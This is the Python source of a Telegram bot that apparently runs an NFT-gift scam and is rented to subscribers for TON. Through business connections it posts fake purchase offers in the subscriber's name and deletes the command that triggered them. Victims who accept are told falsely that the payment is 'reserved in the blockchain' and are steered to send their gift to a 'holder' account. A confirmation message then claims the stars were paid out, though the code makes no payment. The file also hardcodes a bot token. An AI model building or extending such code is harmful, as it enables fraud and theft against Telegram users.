"""
Sulumi Team Bot — Full persistent + anti-freeze
"""

import os
import re
import uuid
import time
import sqlite3
import requests
import logging

from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=8)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "9087583806:AAE1nylRFVLF54ppc6EQZJyDE8vQwhN6bYY")
OWNER_ID = int(os.environ.get("OWNER_ID", "9207314182"))
PAYMENT = os.environ.get("PAYMENT", "pantera138382")
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://offera-5uqe.onrender.com")
DB_PATH = os.environ.get("DATABASE_PATH", "sulumi_bot.db")

E = {
    "stars": "5958376256788502078",
    "grams": "6006074913742396956",
    "decline": "5778527486270770928",
    "accept": "5776375003280838798",
    "forward": "5832251986635920010",
    "check": "6019523512908124649"
}

def ce(name, fb):
    return f'<tg-emoji emoji-id="{E[name]}">{fb}</tg-emoji>'

def btn(t, d, e):
    return {"text": t, "callback_data": d, "icon_custom_emoji_id": E[e]}

def btn_url(t, u, e):
    return {"text": t, "url": u, "icon_custom_emoji_id": E[e]}

def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=15.0)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL;")
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS subscribers (user_id INTEGER PRIMARY KEY, expires_at REAL)")
    c.execute("CREATE TABLE IF NOT EXISTS deals (deal_id TEXT PRIMARY KEY, wid INTEGER, lid INTEGER, slug TEXT, name TEXT, num TEXT, price INTEGER, cur TEXT, holder TEXT, st TEXT, bci TEXT, created REAL)")
    c.execute("CREATE TABLE IF NOT EXISTS user_settings (user_id INTEGER PRIMARY KEY, lang TEXT, cur TEXT, holder TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS user_state (user_id INTEGER PRIMARY KEY, state TEXT, updated REAL)")
    c.execute("CREATE TABLE IF NOT EXISTS business_connections (user_id INTEGER PRIMARY KEY, bci TEXT, updated REAL)")
    c.execute("INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)", (OWNER_ID, -1.0))
    conn.commit()
    conn.close()

def is_allowed(uid):
    try:
        conn = get_db()
        row = conn.execute("SELECT expires_at FROM subscribers WHERE user_id = ?", (uid,)).fetchone()
        conn.close()
        if not row: return False
        return row["expires_at"] == -1.0 or row["expires_at"] > time.time()
    except: return False

def add_subscription(uid, days):
    conn = get_db()
    exp = -1.0 if days == -1 else time.time() + (days * 86400)
    conn.execute("INSERT OR REPLACE INTO subscribers (user_id, expires_at) VALUES (?, ?)", (uid, exp))
    conn.commit()
    conn.close()

def remove_subscription(uid):
    conn = get_db()
    conn.execute("DELETE FROM subscribers WHERE user_id = ?", (uid,))
    conn.commit()
    conn.close()

def get_expires_str(uid):
    try:
        conn = get_db()
        row = conn.execute("SELECT expires_at FROM subscribers WHERE user_id = ?", (uid,)).fetchone()
        conn.close()
        if not row: return "Неизвестно"
        if row["expires_at"] == -1.0: return "Навсегда"
        return time.strftime("%d.%m.%Y", time.localtime(row["expires_at"]))
    except: return "Неизвестно"

def gs(uid):
    conn = get_db()
    row = conn.execute("SELECT lang, cur, holder FROM user_settings WHERE user_id = ?", (uid,)).fetchone()
    conn.close()
    if row:
        return {"lang": row["lang"] or "ru", "cur": row["cur"] or "stars", "hold": row["holder"] or PAYMENT}
    return {"lang": "ru", "cur": "stars", "hold": PAYMENT}

def save_user_settings(uid, s):
    conn = get_db()
    conn.execute("INSERT OR REPLACE INTO user_settings (user_id, lang, cur, holder) VALUES (?, ?, ?, ?)",
                 (uid, s.get("lang", "ru"), s.get("cur", "stars"), s.get("hold", PAYMENT)))
    conn.commit()
    conn.close()

def set_user_field(uid, key, value):
    s = gs(uid)
    s[key] = value
    save_user_settings(uid, s)

def set_state(uid, state):
    conn = get_db()
    conn.execute("INSERT OR REPLACE INTO user_state (user_id, state, updated) VALUES (?, ?, ?)", (uid, state, time.time()))
    conn.commit()
    conn.close()

def get_state(uid):
    conn = get_db()
    row = conn.execute("SELECT state FROM user_state WHERE user_id = ?", (uid,)).fetchone()
    conn.close()
    return row["state"] if row else None

def clear_state(uid):
    conn = get_db()
    conn.execute("DELETE FROM user_state WHERE user_id = ?", (uid,))
    conn.commit()
    conn.close()

def set_bci(uid, bci):
    conn = get_db()
    conn.execute("INSERT OR REPLACE INTO business_connections (user_id, bci, updated) VALUES (?, ?, ?)", (uid, bci, time.time()))
    conn.commit()
    conn.close()

def get_bci(uid):
    conn = get_db()
    row = conn.execute("SELECT bci FROM business_connections WHERE user_id = ?", (uid,)).fetchone()
    conn.close()
    return row["bci"] if row else None

def save_deal(did, d):
    conn = get_db()
    conn.execute("INSERT OR REPLACE INTO deals (deal_id, wid, lid, slug, name, num, price, cur, holder, st, bci, created) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                 (did, d["wid"], d["lid"], d["slug"], d["name"], d["num"], d["price"], d["cur"], d["hold"], d["st"], d.get("bci"), time.time()))
    conn.commit()
    conn.close()

def get_deal(did):
    conn = get_db()
    row = conn.execute("SELECT * FROM deals WHERE deal_id = ?", (did,)).fetchone()
    conn.close()
    if not row: return None
    return {"did": row["deal_id"], "wid": row["wid"], "lid": row["lid"], "slug": row["slug"], "name": row["name"], "num": row["num"], "price": row["price"], "cur": row["cur"], "hold": row["holder"], "st": row["st"], "bci": row["bci"]}

def set_deal_status(did, st):
    conn = get_db()
    conn.execute("UPDATE deals SET st = ? WHERE deal_id = ?", (st, did))
    conn.commit()
    conn.close()

def api(method, **p):
    try:
        payload = {k: v for k, v in p.items() if v is not None}
        r = requests.post(f"{API}/{method}", json=payload, timeout=60)
        res = r.json()
        if not res.get("ok") and res.get("error_code") == 429:
            retry_after = res.get("parameters", {}).get("retry_after", 2)
            time.sleep(retry_after)
            r = requests.post(f"{API}/{method}", json=payload, timeout=60)
            return r.json()
        return res
    except Exception as e:
        logging.error(f"API ERR: {e}")
        return {}

def fmt(n): return f"{int(n):,}".replace(",", " ")

def sm(cid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def sm_nft(cid, txt, url, kb=None, bci=None):
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML", "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": url}}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def dm(cid, mid, bci=None):
    d = {"chat_id": cid, "message_id": mid}
    if bci: d["business_connection_id"] = bci
    return api("deleteMessage", **d)

def em(cid, mid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML"}
    if kb is not None: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("editMessageText", **d)

def ac(cb, t=None, sa=False):
    d = {"callback_query_id": cb, "show_alert": sa}
    if t: d["text"] = t
    return api("answerCallbackQuery", **d)

def hide_cmd(cid, mid, bci=None):
    res = dm(cid, mid, bci=bci)
    if res.get("ok"): return res
    res2 = em(cid, mid, "?", kb={"inline_keyboard": []}, bci=bci)
    if res2.get("ok"): return res2
    return sm(cid, "?", bci=bci)

def okb(did):
    return {"inline_keyboard": [[btn(" Отклонить", f"decline:{did}", "decline"), btn(" Принять", f"accept:{did}", "accept")]]}

def aakb(did, h):
    return {"inline_keyboard": [[btn_url(" Передать", f"tg://send_gift?to={h.replace('@', '')}", "forward")], [btn(" Проверить", f"check:{did}", "check")]]}

def confirm_kb(did):
    return {"inline_keyboard": [[btn("✅ Подтвердить получение", f"confirm:{did}", "accept")]]}

def pnft(t):
    m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
    if not m: return None
    s = m.group(1)
    np2, num = s.rsplit("-", 1)
    return {"slug": s, "name": re.sub(r'([a-z])([A-Z])', r'\1 \2', np2), "num": num, "nfmt": fmt(num)}

def process_msg(msg):
    try:
        cid = msg["chat"]["id"]
        uid = msg["from"]["id"]
        mid = msg["message_id"]
        ci = msg.get("business_connection_id")
        txt = (msg.get("text") or "").strip()
        if not cid or not uid or not txt: return
        if ci: set_bci(uid, ci)
        state = get_state(uid)

        if state == "holder":
            un = txt.lstrip("@").lower()
            if un and " " not in un:
                set_user_field(uid, "hold", un)
                clear_state(uid)
                sm(cid, f"✅ Держатель: @{un}", bci=ci)
            return
        if state == "lang":
            if txt.lower() in ["ru", "en"]:
                set_user_field(uid, "lang", txt.lower())
                clear_state(uid)
                sm(cid, f"✅ Язык: {'🇷🇺 RU' if txt.lower() == 'ru' else '🇬🇧 EN'}", bci=ci)
            return
        if state == "cur":
            if txt.lower() in ["stars", "grams"]:
                set_user_field(uid, "cur", txt.lower())
                clear_state(uid)
                sm(cid, f"✅ Валюта: {'⭐' if txt.lower() == 'stars' else '💎'}", bci=ci)
            return

        if txt.lower().startswith("shd "):
            parts = txt.split()
            if len(parts) < 3:
                err = sm(cid, "❌ Формат: shd ссылка цена", bci=ci)
                time.sleep(1.5)
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                hide_cmd(cid, mid, bci=ci)
                return
            rest = " ".join(parts[1:])
            ni = pnft(rest)
            if not ni:
                err = sm(cid, "❌ Не найдена NFT", bci=ci)
                time.sleep(1.5)
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                hide_cmd(cid, mid, bci=ci)
                return
            try: pr = int(parts[-1])
            except:
                err = sm(cid, "❌ Цена должна быть числом", bci=ci)
                time.sleep(1.5)
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                hide_cmd(cid, mid, bci=ci)
                return
            if uid != OWNER_ID and not is_allowed(uid):
                err = sm(cid, f"🔒 Доступ закрыт. @{PAYMENT}", bci=ci)
                time.sleep(1.5)
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                hide_cmd(cid, mid, bci=ci)
                return
            s = gs(uid)
            cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
            did = str(uuid.uuid4())[:8]
            sender_bci = ci or get_bci(uid)
            if not sender_bci:
                err = sm(cid, "⚠️ Подключи бизнес-аккаунт!", bci=ci)
                time.sleep(1.5)
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                hide_cmd(cid, mid, bci=ci)
                return
            deal = {"wid": uid, "lid": cid, "slug": ni["slug"], "name": ni["name"], "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"], "st": "pending", "bci": sender_bci}
            save_deal(did, deal)
            nl = f"https://t.me/nft/{ni['slug']}"
            hidden = f'<a href="{nl}">\u200b</a>'
            name = msg["from"].get("first_name") or msg["from"].get("username") or "User"
            cap = hidden + f"<b>{name}</b>предлагает <b>{pr}</b> {cs} за <b>{ni['name']} #{ni['nfmt']}</b>.\n\n5h 59m на решение."
            res = sm_nft(cid, cap, nl, kb=okb(did), bci=sender_bci)
            if res.get("ok"):
                time.sleep(1.5)
                hide_cmd(cid, mid, bci=ci)
            return

        if txt.startswith("/"):
            if txt == "/buy": sm(cid, f"💎 Напишите @{PAYMENT} для покупки", bci=ci); return
            if txt == "/tarifs": sm(cid, "💎 1 День — 1 TON\n3 Дни — 2.5 TON\nНавсегда — 4.5 TON", bci=ci); return
            if txt == "/lg": set_state(uid, "lang"); sm(cid, "🌐 ru или en", bci=ci); return
            if txt == "/cv": set_state(uid, "cur"); sm(cid, "💱 stars или grams", bci=ci); return
            if txt.startswith("/holder"): set_state(uid, "holder"); sm(cid, "👑 Username без @", bci=ci); return
            if uid != OWNER_ID: sm(cid, "🔒 Только для админа", bci=ci); return
            if txt.startswith("/legitt"):
                parts = txt.split()
                if len(parts) < 4 or parts[1] != "add": sm(cid, "❌ Формат: <code>/legitt add id1 id2 id3 дни</code>\n(-1 = навсегда)", bci=ci); return
                try:
                    days = int(parts[-1]); ids = [int(x) for x in parts[2:-1]]; added = []
                    for tid in ids: add_subscription(tid, days); added.append(str(tid))
                    exp_str = "Навсегда" if days == -1 else f"{days} дн."
                    sm(cid, f"✅ Доступ выдан {len(added)} пользователям:\n<code>{', '.join(added)}</code>\nСрок: {exp_str}", bci=ci)
                except Exception as e: sm(cid, f"❌ Ошибка: {e}", bci=ci)
                return
            if txt.startswith("/zabrat"):
                parts = txt.split()
                if len(parts) < 2: sm(cid, "❌ Формат: <code>/zabrat id</code>", bci=ci); return
                try:
                    target_uid = int(parts[1]); remove_subscription(target_uid)
                    sm(cid, f"✅ Доступ отозван у <code>{target_uid}</code>", bci=ci)
                except Exception as e: sm(cid, f"❌ Ошибка: {e}", bci=ci)
                return
            if txt == "/list":
                conn = get_db(); rows = conn.execute("SELECT user_id, expires_at FROM subscribers").fetchall(); conn.close()
                if not rows: sm(cid, "📋 Список пуст", bci=ci); return
                ul = "\n".join([f"• <code>{r['user_id']}</code> — {get_expires_str(r['user_id'])}" for r in rows])
                sm(cid, f"📋 Доступы ({len(rows)}):\n\n{ul}", bci=ci)
                return
    except Exception as e:
        logging.error(f"MSG ERR: {e}")
        # --- CALLBACK HANDLER ---

def process_cb(cb):
    try:
        cbid = cb["id"]
        uid = cb["from"]["id"]
        msg = cb.get("message") or {}
        cid = msg.get("chat", {}).get("id", uid)
        mid = msg.get("message_id", 0)
        data = cb.get("data", "")
        ci = msg.get("business_connection_id")

        if data.startswith("check:"):
            did = data.split(":", 1)[1]
            deal = get_deal(did)
            if not deal:
                ac(cbid, txt="❌ Оффер не найден", sa=True)
                return
            if deal["st"] not in ("accepted", "checking"):
                ac(cbid, txt="❌ Оффер не активен", sa=True)
                return
            if deal["st"] == "checking":
                ac(cbid, txt="⏳ Уже проверяется", sa=True)
                return
            set_deal_status(did, "checking")
            ac(cbid)
            nf = fmt(deal["num"])
            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
            h = deal["hold"]
            nl = f"https://t.me/nft/{deal['slug']}"
            bci = deal.get("bci") or ci
            hidden = f'<a href="{nl}">\u200b</a>'
            txt = hidden + f"🔄 <b>Статус: Проверяется передача</b>\n\n"
            txt += f"Ожидается NFT <b>{deal['name']} #{nf}</b> от @{h}.\n"
            txt += f"После получения NFT, {deal['price']} {cs} будут разморожены."
            em(cid, mid, txt, kb=confirm_kb(did), bci=bci)
            return

        if data.startswith("confirm:"):
            did = data.split(":", 1)[1]
            deal = get_deal(did)
            if not deal or deal["st"] != "checking":
                ac(cbid, txt="❌ Сделка не активна", sa=True)
                return
            set_deal_status(did, "completed")
            ac(cbid)
            nf = fmt(deal["num"])
            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
            h = deal["hold"]
            nl = f"https://t.me/nft/{deal['slug']}"
            bci = deal.get("bci") or ci
            hidden = f'<a href="{nl}">\u200b</a>'
            txt = hidden + f"✅ <b>Сделка успешно завершена!</b>\n\n"
            txt += f"NFT <b>{deal['name']} #{nf}</b> получен.\n"
            txt += f"{deal['price']} {cs} отправлены продавцу."
            em(cid, mid, txt, kb={"inline_keyboard": []}, bci=bci)
            return

        if data.startswith("accept:"):
            did = data.split(":", 1)[1]
            deal = get_deal(did)
            if not deal or deal["st"] != "pending":
                ac(cbid)
                return
            set_deal_status(did, "accepted")
            ac(cbid)
            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
            nf = fmt(deal["num"])
            h = deal["hold"]
            nl = f"https://t.me/nft/{deal['slug']}"
            bci = deal.get("bci") or ci
            hidden = f'<a href="{nl}">\u200b</a>'
            txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы в блокчейне.\n\n"
            txt += f"Ожидается передача подарка <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\n"
            txt += f"Нажмите кнопку «Передать» и отправьте подарок <b>{deal['name']} #{nf}</b> пользователю <b>@{h}</b>. После завершения сделки {cs} автоматически начислятся на ваш аккаунт."
            d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML", "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": nl}, "reply_markup": aakb(did, h)}
            if bci:
                d["business_connection_id"] = bci
            res = api("editMessageText", **d)
            if not res.get("ok"):
                dm(cid, mid, bci=bci)
                sm_nft(cid, txt, nl, kb=aakb(did, h), bci=bci)
            return

        if data.startswith("decline:"):
            did = data.split(":", 1)[1]
            deal = get_deal(did)
            if not deal or deal["st"] != "pending":
                ac(cbid)
                return
            set_deal_status(did, "declined")
            ac(cbid)
            bci = deal.get("bci") or ci
            em(cid, mid, "❌ Оффер отклонён.", kb={"inline_keyboard": []}, bci=bci)
            return

        ac(cbid)
    except Exception as e:
        logging.error(f"CB ERR: {e}")

def process_update(u):
    try:
        if "message" in u: process_msg(u["message"])
        elif "business_message" in u: process_msg(u["business_message"])
        elif "callback_query" in u: process_cb(u["callback_query"])
        elif "business_connection" in u:
            bc = u["business_connection"]
            set_bci(bc["user"]["id"], bc["id"])
    except Exception as e:
        logging.error(f"UPDATE ERR: {e}")

@app.route("/webhook", methods=["POST"])
def webhook():
    u = request.get_json(force=True, silent=True)
    if u:
        executor.submit(process_update, u)
    return jsonify({"ok": True}), 200

@app.route("/")
def index():
    return "OK"

def set_wh():
    r = api("setWebhook", url=f"{RENDER_URL}/webhook", allowed_updates=["message", "callback_query", "business_connection", "business_message"])
    logging.info(f"Webhook set: {r}")

def set_cmd():
    api("setMyCommands", commands=[
        {"command": "buy", "description": "Купить"}, {"command": "tarifs", "description": "Цены"},
        {"command": "lg", "description": "Язык"}, {"command": "cv", "description": "Валюта"},
        {"command": "holder", "description": "Держатель"}, {"command": "list", "description": "Список (админ)"},
        {"command": "zabrat", "description": "Отозвать (админ)"}, {"command": "legitt", "description": "Выдать (админ)"}
    ])

init_db()

if __name__ == "__main__":
    set_wh()
    set_cmd()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
